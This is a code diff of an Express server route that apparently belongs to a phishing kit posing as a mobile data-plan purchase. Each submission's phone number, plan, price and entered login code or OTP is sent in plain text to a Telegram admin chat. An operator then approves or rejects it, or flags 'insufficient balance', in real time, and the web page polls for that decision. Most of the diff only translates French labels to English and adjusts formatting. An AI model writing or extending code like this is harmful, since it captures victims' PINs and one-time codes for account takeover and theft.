@@ -74,25 +74,26 @@ app.post('/api/request-approval', async (req, res) => {
   });
 
   if (bot && ADMIN_CHAT_ID) {
-    const stepLabel = step === 'otp' ? 'Vérification OTP' : 'Connexion';
-    const secretLine =
-      step === 'otp'
-        ? `🔑 Code OTP saisi : \`${otp || '—'}\`\n`
-        : `🔑 Code saisi : \`${code || '—'}\`\n`;
+  const stepLabel = step === 'otp' ? 'OTP Verification' : 'Login';
+
+  const secretLine =
+    step === 'otp'
+       ? `🔑 OTP Code Entered: \`${otp || '—'}\`\n`
+: `🔑 Code Entered: \`${code || '—'}\`\n`;
     const text =
-      `🔔 *New login attempt — ${stepLabel}*\n\n` +
-      `📦 data : ${plan || '—'}\n` +
-      `💰 Price : $${price || '—'}\n` +
-      `📱 Téléphone : +243${phone || '—'}\n` +
+      `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
+      `📦 Data: ${plan || '—'}\n` +
+      `💰 Price: $${price || '—'}\n` +
+      `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine +
-      `🆔 ID : \`${id}\``;
+      `🆔 ID: \`${id}\``;
 
     const buttonRow =
       step === 'otp'
         ? [
             { text: '✅ Approve', callback_data: `approve:${id}` },
             { text: '❌ Reject', callback_data: `deny:${id}` },
-            { text: '⚠️ Insuffisient', callback_data: `insufficient:${id}` },
+            { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
           ]
         : [
             { text: '✅ Approve', callback_data: `approve:${id}` },
@@ -113,7 +114,6 @@ app.post('/api/request-approval', async (req, res) => {
 
   res.json({ id });
 });
-
 // ---------------------------------------------------------------------------
 // Poll approval status
 // ---------------------------------------------------------------------------
@@ -131,12 +131,12 @@ const STATUS_BY_ACTION = {
   deny: 'denied',
   insufficient: 'insufficient',
 };
+
 const LABEL_BY_ACTION = {
   approve: 'Approve ✅',
   deny: 'Reject ❌',
-  insufficient: 'Solde insuffisant ⚠️',
+  insufficient: 'Insufficient Balance ⚠️',
 };
-
 if (bot) {
   bot.on('callback_query', async (query) => {
     const [action, id] = (query.data || '').split(':');
